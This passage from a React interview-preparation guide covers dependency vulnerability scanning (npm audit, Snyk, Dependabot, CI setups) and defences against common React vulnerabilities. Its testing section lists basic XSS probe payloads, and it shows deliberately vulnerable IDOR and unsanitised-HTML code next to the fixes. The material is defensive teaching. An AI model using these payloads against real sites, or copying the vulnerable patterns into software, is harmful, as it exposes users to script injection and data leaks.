3. Server Validation: Verify content with magic numbers, size limits
4. Storage: Outside web root, random filenames
5. Serving: Authenticated endpoint with access control
6. Additional: Malware scanning, secure headers
7. Example: Show complete server-side validation

</details>

---

### 189. What is dependency security scanning?

<details>
<summary>View Answer</summary>

**Dependency security scanning** is the process of automatically identifying known security vulnerabilities in third-party packages and dependencies used in your React application. It helps detect and fix vulnerabilities before they can be exploited in production.

#### Why It's Critical

**Modern Apps Have Many Dependencies:**
```bash
# Typical React app
$ npm list --depth=0
├── react@18.2.0
├── react-dom@18.2.0
├── react-router-dom@6.20.0
└── ... (50+ direct dependencies)

# With transitive dependencies
$ npm list
└── ... (1000+ total dependencies)

# Each dependency is a potential attack vector
```

**Real-World Impact:**
```
- 2021: npm package "ua-parser-js" compromised (8M weekly downloads)
- 2022: node-ipc package sabotaged by maintainer
- 2023: Multiple npm packages found with malicious code
- Supply chain attacks increasing 742% (Sonatype 2023)
```

---

#### Built-in npm/yarn Tools

**npm audit:**
```bash
# Check for vulnerabilities
$ npm audit

# Output:
# found 4 vulnerabilities (2 moderate, 2 high)

# View details
$ npm audit --json

# Auto-fix (updates packages)
$ npm audit fix

# Force fix (may break compatibility)
$ npm audit fix --force

# Generate report
$ npm audit --audit-level=moderate
```

**Example npm audit output:**
```bash
# High Severity Vulnerability

Regular Expression Denial of Service
Package: semver
Patched in: >=7.5.2
Dependency of: @babel/core
Path: @babel/core > semver
More info: https://github.com/advisories/GHSA-...

Recommendation: Update to semver@7.5.2 or later
```

**yarn audit:**
```bash
# Yarn classic
$ yarn audit

# Yarn berry (v2+)
$ yarn npm audit

# Generate JSON report
$ yarn audit --json
```

---

#### Automated Scanning Tools

**1. Snyk:**
```bash
# Install
$ npm install -g snyk

# Authenticate
$ snyk auth

# Test for vulnerabilities
$ snyk test

# Monitor project (continuous scanning)
$ snyk monitor

# Fix vulnerabilities
$ snyk fix
```

**Snyk Configuration (.snyk):**
```yaml
# Snyk (https://snyk.io) policy file

version: v1.25.0

# Ignore specific vulnerabilities
ignore:
  SNYK-JS-LODASH-590103:
    - '*':
        reason: False positive - not using vulnerable function
        expires: 2024-12-31

# Patch rules
patch:
  SNYK-JS-AXIOS-1038255:
    - axios:
        patched: '2023-01-15T10:00:00.000Z'
```

**2. OWASP Dependency-Check:**
```bash
# Install
$ npm install -g @owasp/dependency-check

# Run scan
$ dependency-check --project "My App" --scan ./

# Generate HTML report
$ dependency-check --project "My App" --scan ./ --format HTML
```

**3. GitHub Dependabot:**
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    
    # Auto-merge minor updates
    reviewers:
      - "security-team"
    
    # Security updates only
    open-pull-requests-limit: 5
    
    # Ignore specific dependencies
    ignore:
      - dependency-name: "react"
        update-types: ["version-update:semver-major"]
```

**4. npm-check-updates:**
```bash
# Install
$ npm install -g npm-check-updates

# Check for updates
$ ncu

# Update package.json
$ ncu -u

# Install updates
$ npm install
```

---

#### CI/CD Integration

**GitHub Actions:**
```yaml
# .github/workflows/security.yml
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    # Run weekly
    - cron: '0 0 * * 0'

jobs:
  security:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run npm audit
        run: npm audit --audit-level=moderate
        continue-on-error: false
      
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
      
      - name: Upload results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: snyk.sarif
```

**GitLab CI:**
```yaml
# .gitlab-ci.yml
security_scan:
  stage: test
  image: node:18
  script:
    - npm ci
    - npm audit --audit-level=moderate
    - npm install -g snyk
    - snyk test --severity-threshold=high
  allow_failure: false
  only:
    - merge_requests
    - main
```

**Jenkins:**
```groovy
pipeline {
  agent any
  
  stages {
    stage('Security Scan') {
      steps {
        sh 'npm ci'
        sh 'npm audit --audit-level=moderate'
        
        // Snyk scan
        snykSecurity(
          snykInstallation: 'Snyk',
          snykTokenId: 'snyk-token',
          severity: 'high'
        )
      }
    }
  }
}
```

---

#### Vulnerability Databases

**1. National Vulnerability Database (NVD):**
```
- Government database of vulnerabilities
- CVE (Common Vulnerabilities and Exposures) IDs
- CVSS (Common Vulnerability Scoring System) scores
- https://nvd.nist.gov/
```

**2. npm Advisory Database:**
```
- npm's vulnerability database
- Community-reported issues
- https://github.com/advisories
```

**3. Snyk Vulnerability DB:**
```
- Proprietary database
- Faster updates than NVD
- https://security.snyk.io/
```

---

#### Handling Vulnerabilities

**Assessment Process:**
```javascript
// 1. Identify vulnerability
// - Run: npm audit

// 2. Assess severity
const severityLevels = {
  critical: 'Immediate action required',
  high: 'Fix within 24 hours',
  moderate: 'Fix within 1 week',
  low: 'Fix in next release',
};

// 3. Check exploitability
// - Is the vulnerable code path used?
// - Is it reachable from user input?
// - What's the attack surface?

// 4. Determine fix strategy
```

**Fix Strategies:**
```bash
# 1. Update to patched version (Best)
$ npm update package-name

# 2. Update to latest (if compatible)
$ npm install package-name@latest

# 3. Use alternative package
$ npm uninstall vulnerable-package
$ npm install secure-alternative

# 4. Apply patch with patch-package
$ npx patch-package vulnerable-package

# 5. Temporary: Add to audit ignore (Last resort)
$ npm audit --audit-level=high
```

**package.json overrides (npm 8.3+):**
```json
{
  "overrides": {
    "package-with-vuln-dep": {
      "vulnerable-dep": "^2.0.0"
    }
  }
}
```

**yarn resolutions:**
```json
{
  "resolutions": {
    "**/vulnerable-dep": "^2.0.0"
  }
}
```

---

#### Complete Security Workflow

**package.json scripts:**
```json
{
  "scripts": {
    "security:audit": "npm audit",
    "security:fix": "npm audit fix",
    "security:check": "npm audit --audit-level=moderate",
    "security:snyk": "snyk test",
    "security:snyk-monitor": "snyk monitor",
    "precommit": "npm run security:check",
    "prepush": "npm run security:audit"
  }
}
```

**Pre-commit hook (Husky):**
```javascript
// .husky/pre-commit
#!/bin/sh
. "$(dirname "$0")/_/husky.sh"

# Run security check
echo "Running security scan..."
npm audit --audit-level=high

if [ $? -ne 0 ]; then
  echo "Security vulnerabilities found! Commit blocked."
  exit 1
fi

echo "Security check passed."
```

---

#### Monitoring & Alerts

**Snyk Monitor:**
```bash
# Monitor project continuously
$ snyk monitor

# Receives alerts when new vulnerabilities are discovered
# Email notifications
# Slack integration
# Webhook notifications
```

**GitHub Security Alerts:**
```yaml
# Automatically enabled for public repos
# Settings > Security & analysis > Dependabot alerts

# Receives:
# - Email notifications
# - In-app notifications
# - Pull requests with fixes
```

**Custom Monitoring Script:**
```javascript
// scripts/security-monitor.js
const { execSync } = require('child_process');
const nodemailer = require('nodemailer');

async function checkSecurity() {
  try {
    // Run audit
    execSync('npm audit --json > audit-result.json', {
      stdio: 'inherit',
    });
    
    const result = require('./audit-result.json');
    
    // Check severity
    const { high, critical } = result.metadata.vulnerabilities;
    
    if (high > 0 || critical > 0) {
      // Send alert
      await sendSecurityAlert({
        high,
        critical,
        details: result.advisories,
      });
    }
  } catch (error) {
    console.error('Security check failed:', error);
  }
}

async function sendSecurityAlert(vulns) {
  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: 587,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });
  
  await transporter.sendMail({
    from: 'security@example.com',
    to: 'dev-team@example.com',
    subject: 'Security Alert: Vulnerabilities Detected',
    html: `
      <h2>Security Vulnerabilities Found</h2>
      <p>High: ${vulns.high}</p>
      <p>Critical: ${vulns.critical}</p>
      <p>Please run <code>npm audit</code> for details.</p>
    `,
  });
}

// Run check
checkSecurity();
```

---

#### Best Practices

**✅ Regular Scanning:**
```bash
# Run daily in CI/CD
# Schedule: Every commit, daily, weekly
```

**✅ Automated Updates:**
```yaml
# Use Dependabot or Renovate
# Auto-merge minor/patch updates
# Manual review for major updates
```

**✅ Security Policy:**
```markdown
# SECURITY.md

## Vulnerability Response

1. Critical: Fix within 24 hours
2. High: Fix within 1 week
3. Moderate: Fix within 1 month
4. Low: Fix in next release

## Reporting

Email: security@example.com
```

**✅ Monitor Transitive Dependencies:**
```bash
# Not just direct dependencies
$ npm list package-name
# Shows full dependency tree
```

**✅ Keep Dependencies Updated:**
```bash
# Regular updates reduce vulnerability window
$ npm outdated
$ npm update
```

**✅ Use Lock Files:**
```bash
# Commit package-lock.json or yarn.lock
# Ensures consistent installs
# Prevents unexpected vulnerable versions
```

**✅ Minimize Dependencies:**
```javascript
// Fewer dependencies = smaller attack surface
// Question each dependency:
// - Is it actively maintained?
// - Can we implement it ourselves?
// - Are there safer alternatives?
```

---

#### Common Vulnerabilities to Watch

**Prototype Pollution:**
```javascript
// Vulnerable packages: lodash (old versions), minimist
// Attack: Modify Object.prototype
```

**Regular Expression DoS (ReDoS):**
```javascript
// Vulnerable: Complex regex in validation libraries
// Attack: Crafted input causes catastrophic backtracking
```

**Command Injection:**
```javascript
// Vulnerable: Packages executing shell commands
// Attack: Inject malicious commands
```

**Path Traversal:**
```javascript
// Vulnerable: File handling packages
// Attack: Access files outside intended directory
```

**Malicious Packages:**
```javascript
// Typosquatting: react-native-v8 vs react-native-v8-malicious
// Compromised accounts: Maintainer accounts hacked
// Backdoors: Hidden malicious code
```

---

#### Tools Comparison

**npm audit:**
```
Pros:
- Built-in, no setup
- Fast
- Free

Cons:
- Basic features
- Limited database
- No advanced filtering
```

**Snyk:**
```
Pros:
- Comprehensive database
- Fast updates
- CI/CD integration
- Fix suggestions
- License scanning

Cons:
- Paid for advanced features
- Requires account
```

**GitHub Dependabot:**
```
Pros:
- Free for GitHub repos
- Auto-creates PRs
- Easy setup

Cons:
- GitHub only
- Less detailed than Snyk
```

---

#### Interview Tips

✅ **Key Points:**
- Dependency scanning checks third-party packages for vulnerabilities
- npm audit/yarn audit are built-in tools
- CI/CD integration ensures continuous monitoring
- Snyk, Dependabot, OWASP tools for advanced scanning
- Regular updates and monitoring are critical
- Use lock files and minimize dependencies

✅ **When to Mention:**
- Security architecture discussions
- CI/CD pipeline design
- DevOps practices
- Third-party package usage
- Supply chain security

✅ **Common Follow-ups:**
- "What's the difference between npm audit and Snyk?"
- "How do you handle false positives?"
- "What's your vulnerability response process?"
- "How often should you scan?"
- "What about transitive dependencies?"

✅ **Perfect Answer Structure:**
1. Definition: Automated scanning for known vulnerabilities in dependencies
2. Why Critical: Modern apps have 1000+ dependencies
3. Tools: npm audit, Snyk, Dependabot, OWASP
4. CI/CD: Integrate scanning in pipeline
5. Response: Assess severity, update/patch/replace
6. Monitoring: Continuous alerts for new vulnerabilities
7. Best Practices: Regular updates, minimize dependencies, use lock files

</details>

---

### 190. How do you protect against common React vulnerabilities?

<details>
<summary>View Answer</summary>

**Protecting against React vulnerabilities** requires a multi-layered security approach covering XSS prevention, authentication, dependency management, input validation, secure configuration, and following security best practices throughout the development lifecycle.

#### Common React Vulnerabilities

**1. Cross-Site Scripting (XSS)**
**2. Insecure Dependencies**
**3. Exposed API Keys/Secrets**
**4. Insecure Authentication**
**5. CSRF Attacks**
**6. Injection Attacks**
**7. Insecure Direct Object References (IDOR)**
**8. Security Misconfiguration**

---

#### 1. XSS Prevention

**✅ Use React's Default Escaping:**
```jsx
// SAFE - React automatically escapes
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>;
}

// User input: <script>alert('XSS')</script>
// Rendered as: &lt;script&gt;alert('XSS')&lt;/script&gt;
```

**❌ Avoid dangerouslySetInnerHTML:**
```jsx
// DANGEROUS
function Vulnerable({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// If absolutely necessary, sanitize first
import DOMPurify from 'dompurify';

function Safe({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: [],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**✅ Validate URLs:**
```jsx
function SafeLink({ href, children }) {
  // Block dangerous protocols
  const dangerous = /^(javascript|data|vbscript):/i;
  
  if (dangerous.test(href)) {
    console.warn('Blocked dangerous URL:', href);
    return <span>{children}</span>;
  }
  
  return <a href={href}>{children}</a>;
}
```

**✅ Sanitize User Input:**
```jsx
import DOMPurify from 'dompurify';

function CommentForm({ onSubmit }) {
  const [comment, setComment] = useState('');
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Sanitize before sending to server
    const clean = DOMPurify.sanitize(comment, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    });
    
    onSubmit(clean);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <textarea
        value={comment}
        onChange={(e) => setComment(e.target.value)}
        maxLength={1000}
      />
      <button type="submit">Post</button>
    </form>
  );
}
```

---

#### 2. Secure Dependencies

**✅ Regular Audits:**
```bash
# Check for vulnerabilities
npm audit

# Auto-fix where possible
npm audit fix

# CI/CD integration
npm audit --audit-level=high
```

**✅ Use Snyk or Dependabot:**
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

**✅ Minimize Dependencies:**
```javascript
// Before adding a package, ask:
// 1. Is it actively maintained?
// 2. How many dependencies does it have?
// 3. Can we implement it ourselves?
// 4. Are there more secure alternatives?
```

**✅ Use Lock Files:**
```bash
# Commit package-lock.json or yarn.lock
# Ensures consistent, tested dependency versions
git add package-lock.json
```

---

#### 3. Protect API Keys and Secrets

**❌ Never Hardcode Secrets:**
```jsx
// WRONG - Exposed in bundle
const API_KEY = 'sk_live_abc123xyz';

fetch('https://api.example.com', {
  headers: { 'X-API-Key': API_KEY },
});
```

**✅ Use Environment Variables:**
```javascript
// .env (NOT committed to git)
REACT_APP_API_URL=https://api.example.com

// Usage
const apiUrl = process.env.REACT_APP_API_URL;

fetch(apiUrl, {
  credentials: 'include', // Send httpOnly cookies
});
```

**✅ Backend Proxy for Sensitive APIs:**
```javascript
// Frontend - no API key
fetch('/api/payment', {
  method: 'POST',
  body: JSON.stringify({ amount: 100 }),
});

// Backend - holds the secret key
app.post('/api/payment', async (req, res) => {
  const response = await fetch('https://payment-api.com/charge', {
    headers: {
      'Authorization': `Bearer ${process.env.PAYMENT_API_KEY}`,
    },
    body: JSON.stringify(req.body),
  });
  
  res.json(await response.json());
});
```

**✅ .gitignore:**
```gitignore
# Environment variables
.env
.env.local
.env.development.local
.env.test.local
.env.production.local

# Secrets
secrets/
*.key
*.pem
```

---

#### 4. Secure Authentication

**✅ Use httpOnly Cookies:**
```javascript
// Server sets httpOnly cookie
res.cookie('authToken', token, {
  httpOnly: true,  // Not accessible via JavaScript
  secure: true,    // HTTPS only
  sameSite: 'strict', // CSRF protection
  maxAge: 3600000, // 1 hour
});

// Client - automatically sent with requests
fetch('/api/user', {
  credentials: 'include',
});
```

**✅ Token Refresh Pattern:**
```jsx
import { useState, useEffect } from 'react';

function useAuth() {
  const [user, setUser] = useState(null);
  
  useEffect(() => {
    // Refresh token every 14 minutes (15 min expiry)
    const interval = setInterval(async () => {
      try {
        await fetch('/api/refresh-token', {
          method: 'POST',
          credentials: 'include',
        });
      } catch (error) {
        console.error('Token refresh failed:', error);
        setUser(null);
      }
    }, 14 * 60 * 1000);
    
    return () => clearInterval(interval);
  }, []);
  
  return { user, setUser };
}
```

**❌ Avoid localStorage for Tokens:**
```javascript
// INSECURE - Accessible via XSS
localStorage.setItem('token', token);

// If you must use localStorage:
// 1. Short expiration (15 min)
// 2. Additional XSS protections
// 3. Consider sessionStorage instead
```

**✅ Validate on Server:**
```javascript
// Never trust client-side checks
app.get('/api/admin', authenticateToken, (req, res) => {
  // Server-side authorization check
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  res.json({ data: 'sensitive' });
});
```

---

#### 5. CSRF Protection

**✅ CSRF Tokens:**
```javascript
// Server generates token
const csrfToken = crypto.randomBytes(32).toString('hex');
req.session.csrfToken = csrfToken;

// Send to client
res.json({ csrfToken });

// Client includes in requests
fetch('/api/update', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
  },
  body: JSON.stringify(data),
});

// Server validates
if (req.headers['x-csrf-token'] !== req.session.csrfToken) {
  return res.status(403).json({ error: 'Invalid CSRF token' });
}
```

**✅ SameSite Cookies:**
```javascript
res.cookie('authToken', token, {
  sameSite: 'strict', // Prevents CSRF
  secure: true,
  httpOnly: true,
});
```

---

#### 6. Input Validation

**✅ Client-Side Validation (UX):**
```jsx
function SignupForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState({});
  
  const validate = () => {
    const newErrors = {};
    
    // Email validation
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      newErrors.email = 'Invalid email';
    }
    
    // Password validation
    if (password.length < 8) {
      newErrors.password = 'Password must be at least 8 characters';
    }
    if (!/[A-Z]/.test(password)) {
      newErrors.password = 'Password must contain uppercase';
    }
    if (!/[0-9]/.test(password)) {
      newErrors.password = 'Password must contain number';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validate()) return;
    
    // Submit to server
    await fetch('/api/signup', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
    });
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      {errors.email && <span>{errors.email}</span>}
      
      <input
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      {errors.password && <span>{errors.password}</span>}
      
      <button type="submit">Sign Up</button>
    </form>
  );
}
```

**✅ Server-Side Validation (Security):**
```javascript
const validator = require('validator');

app.post('/api/signup', async (req, res) => {
  const { email, password } = req.body;
  
  // Always validate on server
  if (!validator.isEmail(email)) {
    return res.status(400).json({ error: 'Invalid email' });
  }
  
  if (password.length < 8 || !/[A-Z]/.test(password) || !/[0-9]/.test(password)) {
    return res.status(400).json({ error: 'Password requirements not met' });
  }
  
  // Continue with signup...
});
```

---

#### 7. Prevent IDOR (Insecure Direct Object References)

**❌ Vulnerable:**
```jsx
// User can change ID to access other users' data
function UserProfile() {
  const { userId } = useParams();
  
  useEffect(() => {
    fetch(`/api/users/${userId}`)
      .then(res => res.json())
      .then(setUser);
  }, [userId]);
}

// Server doesn't check authorization
app.get('/api/users/:id', (req, res) => {
  const user = db.users.find(req.params.id);
  res.json(user); // Returns any user's data!
});
```

**✅ Secure:**
```javascript
// Server validates user can access resource
app.get('/api/users/:id', authenticateToken, (req, res) => {
  // Check if user can access this resource
  if (req.user.id !== req.params.id && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  const user = db.users.find(req.params.id);
  res.json(user);
});
```

---

#### 8. Content Security Policy (CSP)

**✅ Implement CSP Headers:**
```javascript
// Express + Helmet
const helmet = require('helmet');

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Avoid unsafe-inline in production
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://api.example.com'],
      fontSrc: ["'self'", 'https://fonts.gstatic.com'],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  })
);
```

**✅ Next.js CSP:**
```javascript
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self' data:",
              "connect-src 'self' https://api.example.com",
            ].join('; '),
          },
        ],
      },
    ];
  },
};
```

---

#### 9. Rate Limiting

**✅ API Rate Limiting:**
```javascript
const rateLimit = require('express-rate-limit');

// General rate limit
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per windowMs
  message: 'Too many requests',
});

app.use('/api/', limiter);

// Stricter for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts',
});

app.use('/api/login', authLimiter);
```

---

#### 10. Secure Headers

**✅ Use Helmet:**
```javascript
const helmet = require('helmet');

app.use(helmet());

// Equivalent to:
app.use(helmet.contentSecurityPolicy());
app.use(helmet.dnsPrefetchControl());
app.use(helmet.frameguard());
app.use(helmet.hidePoweredBy());
app.use(helmet.hsts());
app.use(helmet.ieNoOpen());
app.use(helmet.noSniff());
app.use(helmet.permittedCrossDomainPolicies());
app.use(helmet.referrerPolicy());
app.use(helmet.xssFilter());
```

**Key Headers:**
```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
Referrer-Policy: no-referrer
```

---

#### Complete Security Checklist

**✅ Development:**
```
[ ] Use React's default escaping
[ ] Sanitize with DOMPurify if dangerouslySetInnerHTML needed
[ ] Validate all user input (client + server)
[ ] Use httpOnly cookies for auth tokens
[ ] Implement CSRF protection
[ ] Never expose secrets in code
[ ] Use environment variables
[ ] Regular dependency audits (npm audit)
```

**✅ Deployment:**
```
[ ] Enable HTTPS (SSL/TLS)
[ ] Set secure headers (CSP, HSTS, etc.)
[ ] Implement rate limiting
[ ] Set up monitoring and alerts
[ ] Regular security audits
[ ] Keep dependencies updated
[ ] Use lock files (package-lock.json)
```

**✅ Code Review:**
```
[ ] No dangerouslySetInnerHTML without sanitization
[ ] No hardcoded secrets/API keys
[ ] Server-side validation for all inputs
[ ] Authorization checks on API endpoints
[ ] Proper error handling (no stack traces to client)
[ ] Secure cookie settings
[ ] HTTPS for all external requests
```

---

#### Security Testing

**Manual Testing:**
```javascript
// XSS payloads
const xssTests = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  'javascript:alert(1)',
];

// Test each in form inputs
xssTests.forEach(payload => {
  // Submit payload
  // Verify it's escaped, not executed
});
```

**Automated Testing:**
```bash
# OWASP ZAP
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:3000

# npm audit
npm audit

# Snyk
snyk test
```

---

#### Security Resources

**✅ Documentation:**
```
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- React Security Best Practices: https://reactjs.org/docs/security.html
- MDN Web Security: https://developer.mozilla.org/en-US/docs/Web/Security
```

**✅ Tools:**
```
- npm audit: Built-in dependency scanner
- Snyk: Vulnerability scanning and monitoring
- ESLint Security Plugin: Static analysis
- OWASP ZAP: Dynamic security testing
- Helmet: Security headers for Express
```

---

#### Interview Tips

✅ **Key Points:**
- Use React's automatic escaping, avoid dangerouslySetInnerHTML
- Sanitize user input with DOMPurify when necessary
- httpOnly cookies for authentication tokens
- Regular dependency audits (npm audit, Snyk)
- CSRF protection with tokens and SameSite cookies
- Never expose secrets in frontend code
- Validate on both client (UX) and server (security)
- Implement CSP headers and rate limiting

✅ **When to Mention:**
- Security architecture discussions
- Code review best practices
- Authentication/authorization design
- API security
- DevOps and deployment

✅ **Common Follow-ups:**
- "What's the most common React vulnerability?"
- "How do you prevent XSS?"
- "Client vs server validation?"
- "How do you secure API keys?"
- "What's CSP and why is it important?"

✅ **Perfect Answer Structure:**
1. Main Threats: XSS, insecure dependencies, exposed secrets
2. XSS Prevention: Use React's escaping, sanitize with DOMPurify
3. Auth Security: httpOnly cookies, token refresh, server validation
4. Dependencies: npm audit, Snyk, regular updates
5. Input Validation: Client (UX) + Server (security)
6. Configuration: CSP headers, HTTPS, rate limiting
7. Example: Show before/after vulnerable code

</details>
